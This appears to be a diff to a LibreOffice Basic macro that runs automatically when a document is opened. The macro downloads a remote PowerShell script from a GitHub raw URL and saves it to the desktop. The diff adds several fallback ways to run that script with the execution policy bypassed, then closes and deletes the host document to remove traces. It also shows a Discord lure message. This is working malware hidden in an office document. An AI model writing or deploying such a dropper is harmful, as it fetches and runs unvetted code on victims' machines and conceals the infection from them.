@@ -9,7 +9,7 @@ Sub Auto_Open()
     scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/setup"
     
     ' Save directly to desktop
-    savePath = "C:\Users\juraj_iptfkru\Desktop\test\setup.ps1"
+    savePath = "C:\Users\juraj_iptfkru\Desktop\setup.ps1"
     
     On Error GoTo ErrorHandler
     
@@ -31,8 +31,41 @@ Sub Auto_Open()
                "Location: " & savePath & Chr(13) & _
                "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
         
-        ' Run the PowerShell script
-        Shell "powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", 1
+        ' Try multiple approaches to run PowerShell script
+        Dim result As Integer
+        Dim cmdLine As String
+        
+        ' Method 1: Direct PowerShell execution
+        cmdLine = "powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File """ & savePath & """"
+        result = Shell(cmdLine, 1, "", True)
+        
+        ' Method 2: If method 1 fails, try with cmd.exe
+        If result = 0 Then
+            cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
+            result = Shell(cmdLine, 1, "", True)
+        End If
+        
+        ' Method 3: Alternative syntax
+        If result = 0 Then
+            result = Shell("cmd.exe", 1, "/c ""powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", True)
+        End If
+        
+        MsgBox "PowerShell execution attempted. Exit code: " & result
+        
+        ' If PowerShell executed successfully, clean up this document
+        If result <> 0 Then
+            ' Get the current document's file path
+            Dim currentDocPath As String
+            currentDocPath = ConvertFromURL(ThisComponent.getURL())
+            
+            ' Close the current document without saving
+            ThisComponent.close(False)
+            
+            ' Delete the LibreOffice document file to keep system clean
+            If currentDocPath <> "" Then
+                Kill currentDocPath
+            End If
+        End If
         
     Else
         MsgBox "Failed to download script. No content received.", 16, "Download Error"
